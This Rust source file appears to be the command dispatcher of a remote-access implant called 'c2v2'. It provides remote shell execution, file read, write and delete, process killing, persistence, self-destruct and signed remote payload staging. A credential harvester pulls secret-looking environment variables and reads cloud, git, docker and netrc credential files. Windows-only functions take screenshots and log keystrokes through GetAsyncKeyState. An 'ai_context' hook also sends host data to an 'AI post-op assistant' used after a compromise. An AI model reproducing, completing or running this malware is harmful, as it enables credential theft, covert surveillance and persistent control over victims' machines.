use crate::config::Profile;
use crate::platform;
use crate::wire;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::time::Duration;

pub const CAPS: &[&str] = &[
    "ping",
    "sysinfo",
    "net_info",
    "shell",
    "fs",
    "proc",
    "persist",
    "creds",
    "update",
    "selfdestruct",
];

pub fn caps() -> Vec<&'static str> {
    let mut v = CAPS.to_vec();
    if cfg!(windows) {
        v.push("screenshot");
        v.push("keylog");
    }
    v
}

pub fn dispatch(name: &str, args: &Value, prof: &Profile) -> Result<Value, String> {
    let a = |k: &str| -> String {
        args.get(k)
            .and_then(|v| match v {
                Value::String(s) => Some(s.clone()),
                Value::Null => None,
                other => Some(other.to_string()),
            })
            .unwrap_or_default()
    };
    let n = |k: &str, d: u64| -> u64 { args.get(k).and_then(|v| v.as_u64()).unwrap_or(d) };
    let b = |k: &str| -> bool { args.get(k).and_then(|v| v.as_bool()).unwrap_or(false) };

    match name {
        "ping" => Ok(json!({"pong": true, "ts": wire::now(), "module": "ping"})),
        "sysinfo" => Ok(platform::sysinfo()),
        "net_info" => Ok(json!({
            "host": platform::hostname(),
            "addrs": platform::local_addrs(),
            "ts": wire::now(),
        })),
        "shell" => {
            let cmd = a("cmd");
            if cmd.is_empty() {
                return Err("shell: missing --cmd".into());
            }
            let timeout = Duration::from_millis(n("timeout_ms", 30_000).max(1000));
            platform::run_shell(&cmd, timeout)
        }
        "fs_ls" => {
            let path = {
                let p = a("path");
                if p.is_empty() {
                    std::env::current_dir().map(|x| x.to_string_lossy().to_string()).unwrap_or_else(|_| ".".into())
                } else {
                    p
                }
            };
            let rd = std::fs::read_dir(&path).map_err(|e| format!("ls {}: {}", path, e))?;
            let mut items = Vec::new();
            for e in rd.flatten() {
                let md = e.metadata().ok();
                items.push(json!({
                    "name": e.file_name().to_string_lossy(),
                    "dir": md.as_ref().map(|m| m.is_dir()).unwrap_or(false),
                    "size": md.as_ref().map(|m| m.len()).unwrap_or(0),
                    "mtime": md.and_then(|m| m.modified().ok())
                        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                        .map(|d| d.as_secs()).unwrap_or(0),
                }));
                if items.len() > 5000 {
                    break;
                }
            }
            items.sort_by(|x, y| {
                x.get("name").and_then(|v| v.as_str()).unwrap_or("")
                    .cmp(y.get("name").and_then(|v| v.as_str()).unwrap_or(""))
            });
            Ok(json!({"path": path, "count": items.len(), "entries": items}))
        }
        "fs_cat" => {
            let path = a("path");
            if path.is_empty() {
                return Err("fs_cat: missing --path".into());
            }
            let max = n("max_bytes", n("max", 4 << 20)) as usize;
            let data = std::fs::read(&path).map_err(|e| format!("cat {}: {}", path, e))?;
            let truncated = data.len() > max;
            let slice = if truncated { &data[..max] } else { &data[..] };
            Ok(json!({
                "path": path,
                "size": data.len(),
                "truncated": truncated,
                "data_b64": wire::b64(slice),
            }))
        }
        "fs_put" => {
            let path = a("path");
            if path.is_empty() {
                return Err("fs_put: missing --path".into());
            }
            let raw = wire::unb64(&a("data_b64"))?;
            if let Some(parent) = std::path::Path::new(&path).parent() {
                if !parent.as_os_str().is_empty() {
                    let _ = std::fs::create_dir_all(parent);
                }
            }
            use std::io::Write;
            let mut f = std::fs::OpenOptions::new()
                .create(true)
                .write(true)
                .append(b("append"))
                .truncate(!b("append"))
                .open(&path)
                .map_err(|e| format!("put {}: {}", path, e))?;
            f.write_all(&raw).map_err(|e| e.to_string())?;
            Ok(json!({"path": path, "written": raw.len()}))
        }
        "fs_rm" => {
            let path = a("path");
            if path.is_empty() {
                return Err("fs_rm: missing --path".into());
            }
            let p = std::path::Path::new(&path);
            if p.is_dir() {
                std::fs::remove_dir(p).map_err(|e| format!("rmdir {}: {}", path, e))?;
            } else {
                std::fs::remove_file(p).map_err(|e| format!("rm {}: {}", path, e))?;
            }
            Ok(json!({"path": path, "removed": true}))
        }
        "proc_list" => Ok(json!({"processes": platform::process_list()?})),
        "proc_kill" => {
            let pid = n("pid", 0) as u32;
            platform::kill_process(pid)?;
            Ok(json!({"pid": pid, "killed": true}))
        }
        "persist_install" => {
            let name = persist_name(prof);
            let mut v = crate::persist::install(&name);
            if let Some(o) = v.as_object_mut() {
                o.insert("exe".into(), json!(crate::persist::exe_path().to_string_lossy()));
            }
            Ok(v)
        }
        "persist_remove" => Ok(crate::persist::remove(&persist_name(prof))),
        "creds_env" => Ok(creds_env()),
        "screenshot" => screenshot(),
        "keylog_start" => keylog_start(),
        "keylog_stop" => keylog_stop(),
        "update_stage" => update_stage(args, prof),
        "ai_context" => {
            // Read-only evidence bundle for the AI post-op assistant.  This is
            // the client-side extension point: any future signal (persistence
            // markers, update state, recent audit lines) can be appended here
            // without changing the server or the protocol.
            let mut procs = platform::process_list().unwrap_or_default();
            procs.truncate(40);
            Ok(json!({
                "ts": wire::now(),
                "sysinfo": platform::sysinfo(),
                "net": {"host": platform::hostname(), "addrs": platform::local_addrs()},
                "processes": procs,
                "note": "read-only bundle; no files or credentials were collected",
            }))
        }
        "selfdestruct" => {
            let _ = crate::persist::remove(&persist_name(prof));
            crate::persist::schedule_self_delete();
            Ok(json!({"selfdestruct": true, "note": "persistence removed, self-delete scheduled"}))
        }
        other => Err(format!("unknown module {:?}", other)),
    }
}

pub fn persist_name(prof: &Profile) -> String {
    if !prof.persist_name.is_empty() {
        return prof.persist_name.clone();
    }
    // Deterministic per-client name so install/remove/kill always agree.
    let h = crate::crypto::sha256_hex(prof.client_id.as_bytes());
    format!("c2v2-{}", &h[..8])
}

fn creds_env() -> Value {
    let mut vars = Vec::new();
    for (k, v) in std::env::vars() {
        let up = k.to_uppercase();
        if ["TOKEN", "PASSWORD", "PASSWD", "SECRET", "APIKEY", "API_KEY", "CREDENTIAL"]
            .iter()
            .any(|m| up.contains(m))
        {
            vars.push(json!({"name": k, "len": v.len(), "value": truncate(&v, 512)}));
            if vars.len() >= 200 {
                break;
            }
        }
    }
    let mut files = Vec::new();
    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .unwrap_or_default();
    for rel in [
        ".aws/credentials",
        ".git-credentials",
        ".docker/config.json",
        ".netrc",
        ".ssh/id_rsa",
        ".ssh/id_ed25519",
        ".config/gcloud/application_default_credentials.json",
    ] {
        let p = std::path::Path::new(&home).join(rel);
        if let Ok(md) = std::fs::metadata(&p) {
            let mut rec = json!({"path": p.to_string_lossy(), "size": md.len()});
            if md.len() < 8192 && !rel.ends_with("id_rsa") && !rel.ends_with("id_ed25519") {
                if let Ok(s) = std::fs::read_to_string(&p) {
                    rec["preview"] = json!(truncate(&s, 1024));
                }
            }
            files.push(rec);
        }
    }
    json!({"env": vars, "files": files})
}

fn truncate(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        s.to_string()
    } else {
        s.chars().take(n).collect::<String>() + "…"
    }
}

fn screenshot() -> Result<Value, String> {
    if !cfg!(windows) {
        return Err("screenshot: windows only".into());
    }
    let out = std::env::temp_dir().join(format!("c2v2-scr-{}.png", wire::rand_hex(4)));
    let ps = format!(
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; \
         $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
         $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; \
         $g=[System.Drawing.Graphics]::FromImage($bmp); \
         $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); \
         $bmp.Save('{}',[System.Drawing.Imaging.ImageFormat]::Png); \
         Write-Output ('{{0}}x{{1}}' -f $b.Width,$b.Height)",
        out.to_string_lossy().replace('\'', "''")
    );
    let o = std::process::Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", &ps])
        .output()
        .map_err(|e| format!("powershell: {}", e))?;
    if !o.status.success() {
        return Err(format!(
            "screenshot failed: {}",
            String::from_utf8_lossy(&o.stderr).chars().take(400).collect::<String>()
        ));
    }
    let bytes = std::fs::read(&out).map_err(|e| format!("read screenshot: {}", e))?;
    let _ = std::fs::remove_file(&out);
    Ok(json!({
        "format": "png",
        "size": bytes.len(),
        "screen": String::from_utf8_lossy(&o.stdout).trim(),
        "data_b64": wire::b64(&bytes),
    }))
}

#[cfg(windows)]
mod keylog {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{Mutex, OnceLock};

    static RUNNING: AtomicBool = AtomicBool::new(false);
    static BUFFER: OnceLock<Mutex<String>> = OnceLock::new();

    fn buf() -> &'static Mutex<String> {
        BUFFER.get_or_init(|| Mutex::new(String::new()))
    }

    pub fn start() -> Result<(), String> {
        if RUNNING.swap(true, Ordering::SeqCst) {
            return Ok(());
        }
        std::thread::spawn(|| {
            use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
            let mut prev = [0i16; 256];
            while RUNNING.load(Ordering::SeqCst) {
                for vk in 8u16..=254 {
                    let st = unsafe { GetAsyncKeyState(vk as i32) };
                    if (st as u16) & 0x8000 != 0 && (prev[vk as usize] as u16) & 0x8000 == 0 {
                        let shift = (unsafe { GetAsyncKeyState(0x10) } as u16) & 0x8000 != 0;
                        if let Some(c) = map_key(vk, shift) {
                            let mut b = buf().lock().unwrap();
                            if b.len() < 65536 {
                                b.push(c);
                            }
                        }
                    }
                    prev[vk as usize] = st;
                }
                std::thread::sleep(std::time::Duration::from_millis(20));
            }
        });
        Ok(())
    }

    pub fn stop() -> String {
        RUNNING.store(false, Ordering::SeqCst);
        let mut b = buf().lock().unwrap();
        let out = b.clone();
        b.clear();
        out
    }

    fn map_key(vk: u16, shift: bool) -> Option<char> {
        let c = match vk {
            0x08 => '\u{8}',
            0x09 => '\t',
            0x0D => '\n',
            0x20 => ' ',
            0x30..=0x39 => {
                let d = (vk - 0x30) as u8;
                if shift {
                    ")!@#$%^&*(".as_bytes()[d as usize] as char
                } else {
                    (b'0' + d) as char
                }
            }
            0x41..=0x5A => {
                let ch = ((vk - 0x41) as u8 + b'a') as char;
                if shift {
                    ch.to_ascii_uppercase()
                } else {
                    ch
                }
            }
            0xBA => {
                if shift { ':' } else { ';' }
            }
            0xBB => {
                if shift { '+' } else { '=' }
            }
            0xBC => {
                if shift { '<' } else { ',' }
            }
            0xBD => {
                if shift { '_' } else { '-' }
            }
            0xBE => {
                if shift { '>' } else { '.' }
            }
            0xBF => {
                if shift { '?' } else { '/' }
            }
            0xDB => {
                if shift { '{' } else { '[' }
            }
            0xDC => {
                if shift { '|' } else { '\\' }
            }
            0xDD => {
                if shift { '}' } else { ']' }
            }
            0xDE => {
                if shift { '"' } else { '\'' }
            }
            0xC0 => {
                if shift { '~' } else { '`' }
            }
            0x24..=0x2D => {
                if shift { "!@#$%^&*()".as_bytes()[(vk - 0x24) as usize] as char } else { '\0' }
            }
            _ => '\0',
        };
        if c == '\0' {
            None
        } else {
            Some(c)
        }
    }
}

#[cfg(windows)]
fn keylog_start() -> Result<Value, String> {
    keylog::start()?;
    Ok(json!({"keylog": "started"}))
}

#[cfg(windows)]
fn keylog_stop() -> Result<Value, String> {
    Ok(json!({"keylog": "stopped", "text": keylog::stop()}))
}

#[cfg(not(windows))]
fn keylog_start() -> Result<Value, String> {
    Err("keylog: windows only".into())
}

#[cfg(not(windows))]
fn keylog_stop() -> Result<Value, String> {
    Err("keylog: windows only".into())
}

fn update_stage(args: &Value, prof: &Profile) -> Result<Value, String> {
    let s = |k: &str| args.get(k).and_then(|v| v.as_str()).unwrap_or("").to_string();
    let version = s("version");
    let platform_name = s("platform");
    let arch = s("arch");
    let url = s("url");
    let sha = s("sha256");
    let rollout = args.get("rollout").and_then(|v| v.as_i64()).unwrap_or(0);
    let min_version = s("min_version");
    let rollback = s("rollback");
    let sig = s("sig");
    if version.is_empty() || url.is_empty() || sha.is_empty() {
        return Err("update_stage: version, url and sha256 are required".into());
    }
    let key = wire::unb64(&prof.update_key_b64).unwrap_or_default();
    if key.is_empty() {
        return Err("update_stage: no update key configured".into());
    }
    let r = rollout.to_string();
    let ok = crate::crypto::verify_hmac(
        &key,
        &sig,
        &[&version, &platform_name, &arch, &url, &sha, &r, &min_version, &rollback],
    );
    if !ok {
        return Err("update_stage: signature verification failed".into());
    }
    if !platform_name.is_empty() && platform_name != platform::os_name() {
        return Err(format!("update_stage: manifest platform {} != {}", platform_name, platform::os_name()));
    }
    if !arch.is_empty() && arch != platform::arch() {
        return Err(format!("update_stage: manifest arch {} != {}", arch, platform::arch()));
    }
    if rollout <= 0 {
        return Err("update_stage: rollout is 0 (withheld)".into());
    }
    if rollout < 100 {
        let bucket = crate::crypto::hmac_hex(&key, &["rollout", &prof.client_id]);
        let first = u8::from_str_radix(&bucket[..2], 16).unwrap_or(0) as u32;
        if first * 100 / 256 >= rollout as u32 {
            return Err(format!("update_stage: client outside rollout {}%", rollout));
        }
    }
    let base = crate::config::state_dir();
    let dir = std::path::Path::new(&prof.update_dir);
    let dir = if prof.update_dir.is_empty() { base.join("updates") } else { dir.to_path_buf() };
    std::fs::create_dir_all(&dir).map_err(|e| format!("mkdir {}: {}", dir.display(), e))?;
    let suffix = if cfg!(windows) { ".exe" } else { ".bin" };
    let dest = dir.join(format!("{}-{}-{}{}", version, platform::os_name(), platform::arch(), suffix));
    let mut tcfg = prof.transports.first().cloned().unwrap_or_default();
    if tcfg.host.is_empty() {
        tcfg.host = "127.0.0.1".into();
        tcfg.port = 443;
    }
    let bytes = crate::transport::http_get(&url, &tcfg).map_err(|e| format!("download: {}", e))?;
    let got = hex::encode(Sha256::digest(&bytes));
    if !got.eq_ignore_ascii_case(&sha) {
        return Err(format!("update_stage: sha256 mismatch (got {})", got));
    }
    // Keep the previous artifact for rollback before replacing.
    let state_path = dir.join("current.json");
    let mut prev = String::new();
    if let Ok(txt) = std::fs::read_to_string(&state_path) {
        if let Ok(v) = serde_json::from_str::<Value>(&txt) {
            prev = v.get("path").and_then(|x| x.as_str()).unwrap_or("").to_string();
        }
    }
    if !prev.is_empty() && std::path::Path::new(&prev).exists() && prev != dest.to_string_lossy() {
        let _ = std::fs::write(dir.join("previous.json"), json!({"path": prev, "ts": wire::now()}).to_string());
    }
    std::fs::write(&dest, &bytes).map_err(|e| format!("write {}: {}", dest.display(), e))?;
    let state = json!({
        "version": version, "platform": platform::os_name(), "arch": platform::arch(),
        "path": dest.to_string_lossy(), "sha256": got, "rollback": rollback,
        "staged_at": wire::now(), "applied": false,
    });
    std::fs::write(&state_path, state.to_string()).map_err(|e| e.to_string())?;
    Ok(json!({
        "staged": true, "version": version, "path": dest.to_string_lossy(),
        "sha256": got, "size": bytes.len(), "note": "staged only; execution requires operator approval",
    }))
}
